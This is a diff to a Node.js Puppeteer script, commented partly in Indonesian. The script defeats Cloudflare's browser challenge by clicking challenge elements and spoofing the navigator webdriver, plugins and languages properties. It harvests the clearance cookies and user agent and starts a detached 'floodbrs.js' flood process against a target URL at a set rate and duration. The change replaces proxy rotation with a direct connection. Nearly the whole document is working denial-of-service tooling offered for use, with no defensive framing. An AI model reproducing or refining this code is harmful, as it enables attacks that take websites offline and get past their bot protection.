@@ -13,20 +13,9 @@ const proxyFile = process.argv[4];
 const rate = process.argv[5];
 const duration = parseInt(process.argv[6]);
 
-console.log(`[ START ] Cloudflare Bypass Started`);
+console.log(`[ START ] Cloudflare Bypass - Using Direct Connection`);
 console.log(`[ TARGET ] ${targetURL}`);
-
-// Read proxies
-const readProxies = (filePath) => {
-    try {
-        const proxies = fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
-        console.log(`[ PROXY ] Loaded ${proxies.length} proxies`);
-        return proxies.map(proxy => proxy.replace(/https?:\/\//, '').trim());
-    } catch (error) {
-        console.log(`[ ERROR ] Proxy file: ${error.message}`);
-        return [];
-    }
-};
+console.log(`[ INFO ] Using DIRECT connection (no proxy) for bypass`);
 
 // Generate user agent
 const generateUserAgent = () => {
@@ -48,16 +37,15 @@ const cloudflareBypass = async (page) => {
         // Cek status awal
         const initialTitle = await page.title();
         const initialUrl = await page.url();
-        console.log(`[ BYPASS ] Initial - Title: "${initialTitle}", URL: ${initialUrl}`);
+        console.log(`[ BYPASS ] Initial - Title: "${initialTitle}"`);
 
         // TAHAP 1: Tunggu proses "Verifying..." selesai
         console.log(`[ BYPASS ] ⏳ Waiting for "Verifying..." to complete...`);
         
-        let verifyingCompleted = false;
         let attempts = 0;
-        const maxAttempts = 30; // Maksimal 30 detik waiting
+        const maxAttempts = 40; // Maksimal 40 detik waiting
 
-        while (attempts < maxAttempts && !verifyingCompleted) {
+        while (attempts < maxAttempts) {
             await sleep(1000);
             attempts++;
             
@@ -65,24 +53,7 @@ const cloudflareBypass = async (page) => {
                 const currentTitle = await page.title();
                 const currentUrl = await page.url();
                 
-                // Cek tanda-tanda "Verifying..." selesai:
-                // 1. Title berubah dari "Just a moment" atau "Checking"
-                // 2. URL berubah
-                // 3. Ada elemen challenge yang muncul
-                
-                const isVerifying = 
-                    currentTitle.includes('Just a moment') ||
-                    currentTitle.includes('Checking your browser') ||
-                    currentTitle.includes('Verifying') ||
-                    currentUrl.includes('challenge');
-                
-                if (!isVerifying) {
-                    console.log(`[ BYPASS ] ✅ "Verifying" completed after ${attempts}s`);
-                    verifyingCompleted = true;
-                    break;
-                }
-                
-                // Cek jika sudah ada elemen challenge yang muncul
+                // Cek jika "Verifying" selesai dan challenge muncul
                 const challengeElements = await page.$$([
                     'input[type="checkbox"]',
                     '.hcaptcha-box', 
@@ -90,17 +61,27 @@ const cloudflareBypass = async (page) => {
                     '.cf-checkbox',
                     '#challenge-stage input',
                     'input[name="cf_captcha_kind"]',
-                    'label[for="cf-challenge-checkbox"]'
+                    'label[for="cf-challenge-checkbox"]',
+                    'button',
+                    '.button',
+                    '.btn'
                 ].join(','));
                 
                 if (challengeElements.length > 0) {
                     console.log(`[ BYPASS ] ✅ Challenge elements appeared after ${attempts}s`);
-                    verifyingCompleted = true;
                     break;
                 }
                 
-                if (attempts % 5 === 0) {
-                    console.log(`[ BYPASS ] Still verifying... (${attempts}s)`);
+                // Cek jika sudah berhasil melewati challenge
+                if (!currentTitle.includes('Just a moment') && 
+                    !currentTitle.includes('Checking your browser') &&
+                    !currentTitle.includes('Verifying')) {
+                    console.log(`[ BYPASS ] ✅ Auto-verification completed after ${attempts}s`);
+                    return { success: true };
+                }
+                
+                if (attempts % 10 === 0) {
+                    console.log(`[ BYPASS ] Still waiting... (${attempts}s)`);
                 }
                 
             } catch (e) {
@@ -108,13 +89,8 @@ const cloudflareBypass = async (page) => {
             }
         }
 
-        if (!verifyingCompleted) {
-            console.log(`[ BYPASS ] ❌ "Verifying" timed out after ${maxAttempts}s`);
-        }
-
         // TAHAP 2: Handle challenge setelah "Verifying" selesai
         console.log(`[ BYPASS ] 🔍 Looking for challenge elements...`);
-        await sleep(3000);
 
         // Priority selectors untuk challenge Cloudflare
         const challengeSelectors = [
@@ -225,7 +201,7 @@ const cloudflareBypass = async (page) => {
         const finalTitle = await page.title();
         const finalUrl = await page.url();
         
-        console.log(`[ BYPASS ] Final - Title: "${finalTitle}", URL: ${finalUrl}`);
+        console.log(`[ BYPASS ] Final - Title: "${finalTitle}"`);
 
         const isSuccess = !finalTitle.includes('Just a moment') && 
                          !finalTitle.includes('Checking your browser') &&
@@ -246,13 +222,14 @@ const cloudflareBypass = async (page) => {
     }
 };
 
-// Process browser
-const processBrowser = async (proxy, index) => {
+// Main browser process - TANPA PROXY
+const processBrowser = async (index) => {
     let browser;
     try {
         const userAgent = generateUserAgent();
         
-        console.log(`\n[ THREAD ${index} ] 🚀 Starting with proxy: ${proxy}`);
+        console.log(`\n[ THREAD ${index} ] 🚀 Starting with DIRECT connection`);
+        console.log(`[ THREAD ${index} ] User Agent: ${userAgent}`);
         
         const args = [
             '--no-sandbox',
@@ -265,8 +242,7 @@ const processBrowser = async (proxy, index) => {
             '--disable-web-security',
             '--disable-blink-features=AutomationControlled',
             '--window-size=1280,720',
-            `--user-agent=${userAgent}`,
-            `--proxy-server=http://${proxy}`
+            `--user-agent=${userAgent}`
         ];
 
         browser = await puppeteer.launch({
@@ -282,6 +258,8 @@ const processBrowser = async (proxy, index) => {
         // Stealth
         await page.evaluateOnNewDocument(() => {
             Object.defineProperty(navigator, 'webdriver', { get: () => false });
+            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
+            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
         });
 
         console.log(`[ THREAD ${index} ] 🌐 Navigating to target...`);
@@ -289,7 +267,7 @@ const processBrowser = async (proxy, index) => {
         try {
             await page.goto(targetURL, { 
                 waitUntil: 'domcontentloaded',
-                timeout: 45000
+                timeout: 60000
             });
         } catch (navError) {
             console.log(`[ THREAD ${index} ] ⚠️ Navigation warning: ${navError.message}`);
@@ -338,27 +316,28 @@ const processBrowser = async (proxy, index) => {
         await browser.close();
 
         // SUCCESS
-        console.log(`\n[ SUCCESS ] Total Solve : ${index} | Title : ${title} | proxy : ${proxy} | useragent : ${userAgent} | cookies : ${cookieString} |`);
+        console.log(`\n[ SUCCESS ] Total Solve : ${index} | Title : ${title} | proxy : DIRECT | useragent : ${userAgent} | cookies : ${cookieString} |`);
         console.log(`[ SPAWN ] Flood with cookies : ${cookieString} : useragent : ${userAgent}`);
 
-        // Start flood
+        // Start flood.js (bukan floodbrs.js)
         try {
             const floodProcess = spawn('node', [
-                'floodbrs.js',
+                'floodbrs.js',  // Ganti ke flood.js
                 targetURL,
                 duration.toString(),
                 rate,
-                '1',
-                proxyFile,
+                proxyFile,    // Proxy file untuk flood attack
                 cookieString,
-                userAgent,
-                'cf-cookie'
-            ], { detached: true, stdio: 'ignore' });
+                userAgent
+            ], { 
+                detached: true, 
+                stdio: 'ignore' 
+            });
             
             floodProcess.unref();
-            console.log(`[ THREAD ${index} ] ✅ Flood process started`);
+            console.log(`[ THREAD ${index} ] ✅ Flood.js process started with proxies`);
         } catch (spawnError) {
-            console.log(`[ THREAD ${index} ] ❌ Flood error: ${spawnError.message}`);
+            console.log(`[ THREAD ${index} ] ❌ Flood.js spawn error: ${spawnError.message}`);
         }
 
         return { success: true };
@@ -372,19 +351,14 @@ const processBrowser = async (proxy, index) => {
 
 // Main execution
 const main = async () => {
-    const proxies = readProxies(proxyFile);
-    if (proxies.length === 0) {
-        console.log(`[ ERROR ] No proxies available`);
-        return;
-    }
-
-    console.log(`[ INFO ] Using first ${threads} proxies`);
+    console.log(`[ INFO ] Starting ${threads} direct connection threads`);
     
     let successCount = 0;
     let failCount = 0;
 
-    for (let i = 0; i < Math.min(proxies.length, threads); i++) {
-        const result = await processBrowser(proxies[i], i + 1);
+    // Process hanya 1 thread untuk direct connection (lebih aman)
+    for (let i = 0; i < 1; i++) { // Hanya 1 thread untuk direct connection
+        const result = await processBrowser(i + 1);
         
         if (result.success) {
             successCount++;
@@ -394,17 +368,16 @@ const main = async () => {
 
         console.log(`[ STATS ] ✅ Success: ${successCount} | ❌ Failed: ${failCount}`);
         
-        // Delay antara threads
-        if (i < Math.min(proxies.length, threads) - 1) {
-            const delay = 10000;
-            console.log(`[ WAIT ] Pausing for ${delay/1000}s...`);
-            await sleep(delay);
-        }
+        // Hanya 1 thread untuk direct connection, tidak perlu delay
     }
 
     console.log(`\n[ FINAL ] 🏁 Completed! Success: ${successCount}, Failed: ${failCount}`);
-    console.log(`[ INFO ] ⏳ Waiting ${duration}s for floods...`);
-    await sleep(duration * 1000);
+    
+    if (successCount > 0) {
+        console.log(`[ INFO ] ⏳ Flood.js attacks running for ${duration} seconds...`);
+        await sleep(duration * 1000);
+    }
+    
     console.log(`[ END ] ✅ All processes finished`);
 };
 
